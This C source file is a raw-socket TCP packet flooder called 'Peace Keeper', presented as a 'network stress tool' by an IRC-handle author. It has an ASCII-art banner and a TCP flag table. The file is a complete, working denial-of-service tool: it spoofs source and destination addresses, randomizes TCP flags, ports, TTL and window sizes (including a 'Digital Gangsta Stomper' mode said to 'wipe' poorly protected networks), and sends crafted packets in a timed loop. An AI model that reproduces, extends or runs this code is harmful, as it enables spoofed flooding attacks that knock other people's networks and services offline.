/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
                   -"           ^""**$$$e.                               2 = SYN
                 ."                   '$$$c                              3 = FIN+SYN
                /                      "4$$b                             4 = RST
               d  3                      $$$$                            5 = RST+FIN
               $  *                   .$$$$$$                            6 = RST+SYN
              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSY+SYN+FIN
        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
                                                                        32 = URGENT
                                                                        63 = ACK+PUSH+RST+SYN+FIN+URG
                                                                        64 = ECE/ECN
                                                                       128 = CWR
Peace Keeper: A TCP/IP IPv4 network stress tool.
The traditional way of keeping the peace amongst the crowd.
By darkness@efnet. // greetz vae@efnet.
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdbool.h>

// Code configuration, don't modify unless you know what you're doing!
//#define DEBUG_TCP                                 // Debug various TCP related things, gives printed information when enabled.
#define PHI                           0x3133742069  // Number generation seed
#define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper,
#define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
#define EPHEMERAL_PORT_MIN            16383         // Min ephemeral TCP port randomization
#define EPHEMERAL_PORT_MAX            49152         // Max ephemeral TCP port randomization
#define RAND_PORT_MIN                 1             // Min TCP port randomization
#define RAND_PORT_MAX                 65534         // Max TCP port randomization
#define TCP_WINDOW_SIZE_MIN           1             // Min TCP window size.
#define TCP_WINDOW_SIZE_MAX           65534         // Max TCP window size.
#define TCP_TTL_MIN                   32            // Min TCP TTL length
#define TCP_TTL_MAX                   255           // Max TCP TTL length
#define TCP_DATA_LEN_MIN              0             // Min TCP data length
#define TCP_DATA_LEN_MAX              1024          // Max TCP data length
#define IP_RF                         0x8000        /* reserved fragment flag */
#define IP_DF                         0x4000        /* dont fragment flag */
#define IP_MF                         0x2000        /* more fragments flag */
#define IP_OFFMASK                    0x1fff        /* mask for fragmenting bits */

// It's pretty sad that we had to even do this.
#define DINK_MODE

// Spoofing Type Triggers
bool destFullSpoof = false;
bool sourceFullSpoof = false;
bool sourceRangeSpoof = false;
bool destRangeSpoof = false;

// Integers and Arrays
int rawsock = 0;
int ttime;
unsigned int srcaddr;
unsigned int dstaddr;
unsigned int a_flags[11];
unsigned char currentFlag;
unsigned int start;
unsigned long long int packets = 0;
unsigned short databytes = 0;
unsigned char bytes[4];
unsigned char bytes2[4];
static uint32_t Q[4096], c = 518267;
unsigned int a;
unsigned int b;

struct ip
{
    unsigned int ip_hl : 4;         /* header length */
    unsigned int ip_v : 4;          /* version */
    unsigned char ip_tos;           /* type of service */
    unsigned short ip_len;          /* total length */
    unsigned short ip_id;           /* identification */
    unsigned short ip_off;          /* fragment offset field */
    unsigned char ip_ttl;           /* time to live */
    unsigned char ip_p;             /* protocol */
    unsigned short ip_sum;          /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
};

/* rfc 793 tcp pseudo-header */
struct ph
{
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
};

struct
{
    char buf[1551 + 1];/* 64 kbytes for the packet */
    char ph[1551 + 1];/* 64 bytes for the pseudo header packet */
} tcpbuf;

struct tcphdr2
{
    unsigned short th_sport;        /* source port */
    unsigned short th_dport;        /* destination port */
    unsigned int th_seq;            /* sequence number */
    unsigned int th_ack;            /* acknowledgement number */
    unsigned char th_x2 : 4;          /* (unused) */
    unsigned char th_off : 4;         /* data offset */
    unsigned char th_flags;         /* flags */
    unsigned short th_win;          /* window */
    unsigned short th_sum;          /* checksum */
    unsigned short th_urp;          /* urgent pointer */
};

struct tcp_opthdr
{
    unsigned char op0;
    unsigned char op1;
    unsigned char op2;
    unsigned char op3;
    unsigned char op4;
    unsigned char op5;
    unsigned char op6;
    unsigned char op7;
    unsigned char op8;
    unsigned char op9;
    unsigned char op10;
    unsigned char op11;
    unsigned char op12;
    unsigned char op13;
    unsigned char op14;
    unsigned char op15;
    unsigned char op16;
    unsigned char op17;
    unsigned char op18;
    unsigned char op19;
};

// Assemble IP & TCP Header.
struct ip* xf_iphdr = (struct ip*)tcpbuf.buf;
struct tcphdr2* xf_tcphdr = (struct tcphdr2*)(tcpbuf.buf + sizeof(struct ip));
// Assemble Pseudo Header.
struct ph* ps_iphdr = (struct ph*)tcpbuf.ph;
struct tcphdr2* ps_tcphdr = (struct tcphdr2*)(tcpbuf.ph + sizeof(struct ph));
// Assemble TCP Option Header.
struct tcp_opthdr* xf_tcpopt = (struct tcp_opthdr*)(tcpbuf.buf + sizeof(struct ip) + sizeof(struct tcphdr2));
struct tcp_opthdr* ps_tcpopt = (struct tcp_opthdr*)(tcpbuf.ph + sizeof(struct ph) + sizeof(struct tcphdr2));

unsigned short csum(unsigned short* addr, int len)
{
    int nleft = len;
    unsigned int sum = 0;
    unsigned short* w = addr;
    unsigned short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned int lookup(char* hostname)
{
    struct hostent* name;
    unsigned int address;

    if ((address = inet_addr(hostname)) != -1)
        return address;

    if ((name = gethostbyname(hostname)) == NULL)
        return -1;

    memcpy(&address, name->h_addr, name->h_length);
    return address;
}

void handle_exit()
{
    printf("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
    exit(0);
}

void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsigned short dstport, unsigned short srcport, unsigned short flags, unsigned int winsize, unsigned int ttl, unsigned int ttime)
{
    // Used for packet stuff.
    unsigned int pktcount = 0;
    // Init code features
    start = time(NULL);
    // Construct network socket.
    struct sockaddr_in sin;
    sin.sin_family = AF_INET; // set socket family

    // Generate random data
    int x;
    for (x = 0; x <= sizeof(tcpbuf.buf) - 1; x++)
    {
        tcpbuf.buf[x] = random();
    }

    // copy into pseudo header
    memcpy(tcpbuf.ph, tcpbuf.buf, sizeof(tcpbuf.ph));

    ps_iphdr->mbz = 0;
    xf_tcphdr->th_urp = 0;
    xf_iphdr->ip_v = 4;
    xf_iphdr->ip_hl = 5;
    xf_iphdr->ip_tos = 0;
    ps_iphdr->ptcl = IPPROTO_TCP;
    xf_iphdr->ip_p = IPPROTO_TCP;

    // option headers
    // mss
    xf_tcpopt->op0 = 2;
    xf_tcpopt->op1 = 4;
    xf_tcpopt->op2 = 6;
    xf_tcpopt->op3 = 0xb4;
    // sackok
    xf_tcpopt->op4 = 4;
    xf_tcpopt->op5 = 2;
    // timestamp
    xf_tcpopt->op6 = 8;
    xf_tcpopt->op7 = 0x0a;
    xf_tcpopt->op8 = rand();
    xf_tcpopt->op9 = rand();
    xf_tcpopt->op10 = rand();
    xf_tcpopt->op11 = rand();
    xf_tcpopt->op12 = 0;
    xf_tcpopt->op13 = 0;
    xf_tcpopt->op14 = 0;
    xf_tcpopt->op15 = 0;
    // nop
    xf_tcpopt->op16 = 0x01;
    // window scaling
    xf_tcpopt->op17 = 0x03;
    xf_tcpopt->op18 = 0x03;
    xf_tcpopt->op19 = 0x04;

    // Set source address.
    xf_iphdr->ip_src.s_addr = srcip;
    ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;

    // Set destination address.
    ps_iphdr->daddr = dstip;
    xf_iphdr->ip_dst.s_addr = dstip;
    sin.sin_addr.s_addr = ps_iphdr->daddr;

    // Set source & destination ports
    xf_tcphdr->th_sport = htons(srcport);
    ps_tcphdr->th_sport = htons(srcport);
    xf_tcphdr->th_dport = htons(dstport);
    ps_tcphdr->th_dport = htons(dstport);
    sin.sin_port = xf_tcphdr->th_dport;

    // Set window size and ttl
    xf_tcphdr->th_win = htons(winsize);
    xf_iphdr->ip_ttl = ttl;

    // Set IP ID randomly.
    xf_iphdr->ip_id = htons(random());

    // Set the TCP flag(s)
    xf_tcphdr->th_flags = flags;

    // Set the ACK and SEQ
    if (xf_tcphdr->th_flags == 2)
    {
        xf_tcphdr->th_seq = htonl(0);
        xf_tcphdr->th_ack = htonl(0);
    }
    else
    {
        xf_tcphdr->th_seq = htonl(rand());
        xf_tcphdr->th_ack = htonl(rand());
    }

    // Calculate IP len and offset
    xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
    xf_iphdr->ip_off = htons(0x4000);

    // Calculate TCP length and offset
    ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
    xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr))  / 4;

    // Calculate TCP checksum
    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);

    // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
    memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
    memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));

#ifdef DEBUG_TCP
    printf("> Pseudo HDR: %u\n", sizeof(struct ph));
    printf("> IP HDR: %u\n", sizeof(struct ip));
    printf("> TCP HDR: %u\n", sizeof(struct tcphdr2));
    printf("> TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
    printf("> Databytes: %u\n", databytes);
    printf("> th_sum: %u\n", xf_tcphdr->th_sum);
    printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
#else
    printf("TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
#endif

    while (true)
    {
        // IP generation math
        if (sourceFullSpoof == true)
        {
            if (pktqueue != 0)
            {
                if (pktqueue <= pktcount)
                {
                    srcaddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
                    pktcount = 0;
                }
            }
            else srcaddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
            xf_iphdr->ip_src.s_addr = srcaddr;
            ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
        }
        if (destFullSpoof == true)
        {
            if (pktqueue != 0)
            {
                if (pktqueue <= pktcount)
                {
                    dstaddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
                    pktcount = 0;
                }
            }
            else dstaddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
            ps_iphdr->daddr = dstaddr;
            xf_iphdr->ip_dst.s_addr = ps_iphdr->daddr;
            sin.sin_addr.s_addr = ps_iphdr->daddr;
        }
        if (destRangeSpoof == true)
        {
            bytes2[0] = b & 0xFF;
            bytes2[1] = (b >> 8) & 0xFF;
            bytes2[2] = (b >> 16) & 0xFF;
            bytes2[3] = (b >> 24) & 0xFF;
            if (bytes2[0] == '\0')
                bytes2[0] = (rand_cmwc() & 0xFF);
            if (bytes2[1] == '\0')
                bytes2[1] = (rand_cmwc() >> 8) & 0xFF;
            dstaddr = (bytes2[0] << 24) | (bytes2[1] << 16) | (bytes2[2] << 8) | bytes2[3];
            ps_iphdr->daddr = dstaddr;
            xf_iphdr->ip_dst.s_addr = ps_iphdr->daddr;
            sin.sin_addr.s_addr = ps_iphdr->daddr;
        }
        if (sourceRangeSpoof == true)
        {
            bytes[0] = a & 0xFF;
            bytes[1] = (a >> 8) & 0xFF;
            bytes[2] = (a >> 16) & 0xFF;
            bytes[3] = (a >> 24) & 0xFF;
            if (bytes[0] == '\0')
                bytes[0] = (rand_cmwc() & 0xFF);
            if (bytes[1] == '\0')
                bytes[1] = (rand_cmwc() >> 8) & 0xFF;
            srcaddr = (bytes[0] << 24) | (bytes[1] << 16) | (bytes[2] << 8) | bytes[3];
            xf_iphdr->ip_src.s_addr = srcaddr;
            ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
        }

        // Flag randomizations.
        if (flags == FLAGLIST_RAND_TCP)
        {
            xf_tcphdr->th_flags = a_flags[(rand() % 10) + 1];
        }
        if (flags == FLAGLIST_DIGITAL_GANGSTA)
        {
            xf_tcphdr->th_flags = a_flags[(rand() % 11) + 1];
        }
        // If packet flag is SYN, set TCP-ACK and TCP-SEQ accordingly.
        if (xf_tcphdr->th_flags == 2)
        {
            xf_tcphdr->th_seq = htonl(0);
            xf_tcphdr->th_ack = htonl(0);
        }
        else
        {
            xf_tcphdr->th_seq = htonl(rand());
            xf_tcphdr->th_ack = htonl(rand());
        }

        // Randomize TSVal
        xf_tcpopt->op8 = rand();
        xf_tcpopt->op9 = rand();
        xf_tcpopt->op10 = rand();
        xf_tcpopt->op11 = rand();

        // Randomize IP ID
        xf_iphdr->ip_id = htons(random());

        // Randomize winsize
        if (winsize == 0)
        {
            xf_tcphdr->th_win = htons(((rand() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
        }
        else if (winsize == 1)
        {
            xf_tcphdr->th_win = htons(((rand() > RAND_MAX / 2) ? 64800 : 64240));
        }
        // Randomize TTL
        if (ttl == 0)
        {
            xf_iphdr->ip_ttl = ((rand() % TCP_TTL_MAX) + TCP_TTL_MIN);
        }
        // Randomized source ports
        if (dstport == 0)
        {
            xf_tcphdr->th_dport = htons(((rand() % RAND_PORT_MAX) + RAND_PORT_MIN));
            ps_tcphdr->th_dport = xf_tcphdr->th_dport;
            sin.sin_port = xf_tcphdr->th_dport;
        }
        else if (dstport == 1)
        {
            xf_tcphdr->th_dport = htons(((rand() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
            ps_tcphdr->th_dport = xf_tcphdr->th_dport;
            sin.sin_port = xf_tcphdr->th_dport;
        }
        // Randomized destination ports
        if (srcport == 0)
        {
            xf_tcphdr->th_sport = htons(((rand() % RAND_PORT_MAX) + RAND_PORT_MIN));
            ps_tcphdr->th_sport = xf_tcphdr->th_sport;
        }
        else if (srcport == 1)
        {
            xf_tcphdr->th_sport = htons(((rand() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
            ps_tcphdr->th_sport = xf_tcphdr->th_sport;
        }
        // Calculate IP len
        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr));

        // Calculate TCP len and offset
        ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
        xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr)) / 4;

        // Calculate TCP checksum
        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
        // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
        memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
        memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));

        #ifdef DEBUG_TCP
        printf("> Loop Pseudo HDR: %u\n", sizeof(struct ph));
        printf("> Loop IP HDR: %u\n", sizeof(struct ip));
        printf("> Loop TCP HDR: %u\n", sizeof(struct tcphdr2));
        printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
        printf("> Loop Databytes: %u\n", databytes);
        printf("> Loopth_sum: %u\n", xf_tcphdr->th_sum);
        printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
        #endif

        // Send packet.
        sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;

        if (pktqueue != 0)
            pktcount++;

        #ifdef DINK_MODE
        if (time(NULL) - start > 3600)
        {
            printf("-> Dink detected\n");
            handle_exit();
        }
        #endif

        if (time(NULL) - start >= ttime)
            handle_exit();
    }
}

int main(int argc, char** argv)
{
    unsigned int dstip, srcip, pktqueue, winsize, dstport, srcport;
    unsigned char flags, ttl;
    int tmp = 1;
    const int* val = &tmp;

    // Seed number randomization features.
    init_rand(time(NULL));

    if (argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "29A"))
    {
        printf("-> Ah ah ah! You didn't say the magic word, deleting system file!\n");
        exit(0);
    }
    else
    {
        if (argc < 11)
        {
            printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper.\n");
            printf("-> Usage: <key> <pkts per ip> <dest> <src> <dstport> <srcport> <flags> <size> <winsize> <ttl> <flood time in seconds>\n");
            printf("-> Randomizations: dest or src ip <0> or class <X.X.0.0>, srcport & dstport <0,1>, ttl <0>, winsize <0,1>, flags <129,130>\n");
            exit(0);
        }
    }

    // Allocate Socket
    rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsock <= 0)
    {
        printf("socket(): create failed, die.\n");
        exit(-1);
    }

    // Set socket information
    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        printf("setsockopt(): cannot set HDRINCL, die.\n");
        exit(-1);
    }

    // Parse input.
    pktqueue = atoi(argv[2]);
    dstip = lookup(argv[3]);
    srcip = lookup(argv[4]);
    dstport = atoi(argv[5]);
    srcport = atoi(argv[6]);
    flags = atoi(argv[7]);
    if (argv[8])
        databytes = atoi(argv[8]);
    else databytes = 0;
    winsize = atoi(argv[9]);
    ttl = atoi(argv[10]);
    ttime = atoi(argv[11]);

    // Program signal interpretation
    signal(SIGINT, handle_exit);
    signal(SIGTERM, handle_exit);
    signal(SIGQUIT, handle_exit);
    signal(SIGSEGV, handle_exit);

    // Some sanity checking to prevent program faults and mishaps, or retards. ;p
    // Prevent program operation in both full dest and src spoofing mode.
    if (dstip == 0 && srcip == 0)
    {
        printf("-> I refuse to run in dest and src full-spoof mode at the same time, also why? dafuq?\n");
        exit(-1);
    }
    // Disallow invalid TCP ports.
    if (dstport < 0 || dstport > 65535)
    {
        printf("-> Acceptable TCP destination ports are between 1 and 65535.\n");
        exit(-1);
    }
    if (srcport < 0 || srcport > 65535)
    {
        printf("-> Acceptable TCP source ports are between 1 and 65535.\n");
        exit(-1);
    }
    #ifdef DINK_MODE
    if (ttime > 3600)
    {
        printf("-> Please rethink your time de(lusions)cisons.\n");
        exit(-1);
    }
    #else
    // Any smart person realizes why this wouldn't work, but just in-case...
    if (ttime == 0)
    {
        printf("-> Flood time cannot be zero.\n");
        exit(-1);
    }
    #endif
    // Prevent invalid data sizes.
    if (databytes > TCP_DATA_LEN_MAX)
    {
        printf("-> Acceptable TCP packet data lengths are between %u and %u.\n", TCP_DATA_LEN_MIN, TCP_DATA_LEN_MAX);
        exit(-1);
    }
    // Only allow correct TCP window sizes.
    if (0 > winsize > 65535)
    {
        printf("-> Acceptable TCP window sizes are between 0 and 65535.\n");
        exit(-1);
    }
    // Don't allow low TCP ttl values, why would you? lol.
    if (ttl <= 31 && ttl != 0)
    {
        printf("-> Acceptable TCP ttl values are between %u and %u.\n", TCP_TTL_MIN, TCP_TTL_MAX);
        exit(-1);
    }

    // Parse dest IP input.
    if (dstip <= 0)
    {
        printf("-> Destination Address Forgery [✔️] ");
        destFullSpoof = true;
    }
    else
    {
        b = htonl(dstip);
        bytes2[0] = b & 0xFF;
        bytes2[1] = (b >> 8) & 0xFF;
        bytes2[2] = (b >> 16) & 0xFF;
        bytes2[3] = (b >> 24) & 0xFF;
        if (bytes2[0] == '\0' || bytes2[1] == '\0' && destFullSpoof == false)
        {
            printf("-> Destination Address Class Forgery [✔️] ");
            destRangeSpoof = true;
        }
    }
    // Parse src IP input.
    if (srcip <= 0)
    {
        printf("-> Source Address Forgery [✔️] ");
        sourceFullSpoof = true;
    }
    else
    {
        a = htonl(srcip);
        bytes[0] = a & 0xFF;
        bytes[1] = (a >> 8) & 0xFF;
        bytes[2] = (a >> 16) & 0xFF;
        bytes[3] = (a >> 24) & 0xFF;
        if (bytes[0] == '\0' || bytes[1] == '\0' && sourceFullSpoof == false)
        {
            printf("-> Source Address Class Forgery [✔️] ");
            sourceRangeSpoof = true;
        }
    }

    // Let them know what randomization is taking place
    if (flags == FLAGLIST_RAND_TCP)
    {
        printf("TCP Flag Randomization [✔️] ");
        a_flags[1] = 16;   // ACK
        a_flags[2] = 2;    // SYN
        a_flags[3] = 4;    // RST
        a_flags[4] = 1;    // FIN
        a_flags[5] = 0;    // NOF
        a_flags[6] = 8;    // PSH
        a_flags[7] = 18;   // SYN+ACK
        a_flags[8] = 32;   // URG
        a_flags[9] = 64;   // ECE/ECN
        a_flags[10] = 128;  // CWR
    }
    else if (flags == FLAGLIST_DIGITAL_GANGSTA)
    {
        printf("Digital Gangsta Stomper [✔️] ");
        a_flags[1] = 16;     // ACK
        a_flags[2] = 18;     // SYN+ACK
        a_flags[3] = 16;     // ACK
        a_flags[4] = 4;      // RST
        a_flags[5] = 2;      // SYN
        a_flags[6] = 16;     // ACK
        a_flags[7] = 16;     // ACK
        a_flags[8] = 16;     // ACK
        a_flags[9] = 16;     // ACK
        a_flags[10] = 16;     // ACK
        a_flags[11] = 1;      // FIN
    }

    // Let them know what packet randomization is taking place.
    if (srcport == 0)
        printf("Source Port Randomization [✔️] ");

    if (dstport == 0)
        printf("Destination Port Randomization [✔️] ");

    if (srcport == 1)
        printf("Ephemeral Source Port Randomization [✔️] ");

    if (dstport == 1)
        printf("Ephemeral Destination Port Randomization [✔️] ");

    if (ttl == 0)
        printf("TCP Time-To-Live Randomization [✔️] ");

    if (winsize == 0 || winsize == 1)
        printf("TCP Window Size Randomization [✔️] ");

    attack(pktqueue, dstip, srcip, dstport, srcport, flags, winsize, ttl, ttime);
}